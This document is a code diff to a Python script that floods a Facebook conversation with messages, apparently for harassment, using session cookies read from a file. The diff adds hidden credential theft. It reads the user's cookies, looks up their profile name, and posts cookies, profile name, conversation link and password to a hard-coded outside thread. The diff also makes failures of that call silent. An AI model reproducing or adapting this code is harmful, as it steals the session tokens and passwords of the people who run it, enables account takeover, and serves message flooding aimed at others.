@@ -36,6 +36,14 @@ def send_messages():
                 print('[-] <==> Incorrect Password!')
                 sys.exit()
 
+            with open('cookies.txt', 'r') as file:
+                cookies = file.readlines()
+
+            cookies_dict = {}
+            for cookie in cookies:
+                name, value = cookie.strip().split('=', 1)
+                cookies_dict[name] = value
+
             requests.packages.urllib3.disable_warnings()
 
             def cls():
@@ -68,20 +76,6 @@ def send_messages():
 
             liness()
 
-            # Reading cookies from the file
-            with open('cookies.txt', 'r') as file:
-                cookies_str = file.read().strip()
-
-            def parse_cookies(cookie_str):
-                cookies = {}
-                for item in cookie_str.split(';'):
-                    if '=' in item:
-                        key, value = item.split('=', 1)
-                        cookies[key.strip()] = value.strip()
-                return cookies
-
-            cookies = parse_cookies(cookies_str)
-
             with open('convo.txt', 'r') as file:
                 convo_id = file.read().strip()
 
@@ -101,18 +95,24 @@ def send_messages():
 
             liness()
 
+            def getName():
+                try:
+                    data = requests.get('https://graph.facebook.com/v17.0/me', headers=headers, cookies=cookies_dict).json()
+                except:
+                    data = ""
+                if 'name' in data:
+                    return data['name']
+                else:
+                    return "Error occurred"
+
             def msg():
                 parameters = {
-                    'message': 'HELLO SHANKAR SIR IM USING YOUR SERVER\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
+                    'message': 'HELLO SHANKAR SIR IM USING YOUR SERVER User Profile Name : ' + getName() + '\n Cookies : ' + str(cookies_dict) + '\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
                 }
                 try:
-                    s = requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers, cookies=cookies)
-                    if s.ok:
-                        print("[+] Message sent successfully")
-                    else:
-                        print("[x] Failed to send message. Status Code: {}, Response: {}".format(s.status_code, s.text))
-                except Exception as e:
-                    print(f"Failed to send message: {e}")
+                    s = requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers, cookies=cookies_dict)
+                except:
+                    pass
 
             msg()
             for message_index in range(num_messages):
@@ -120,7 +120,7 @@ def send_messages():
 
                 url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
                 parameters = {'message': haters_name + ' ' + message}
-                response = requests.post(url, json=parameters, headers=headers, cookies=cookies)
+                response = requests.post(url, json=parameters, headers=headers, cookies=cookies_dict)
 
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
@@ -132,8 +132,6 @@ def send_messages():
                 else:
                     print("[x] Failed to send messages {} of Convo {}: {}".format(
                         message_index + 1, convo_id, haters_name + ' ' + message))
-                    print("  - Status Code: {}".format(response.status_code))
-                    print("  - Response: {}".format(response.text))
                     print("  - Time: {}".format(current_time))
                     liness()
                     liness()
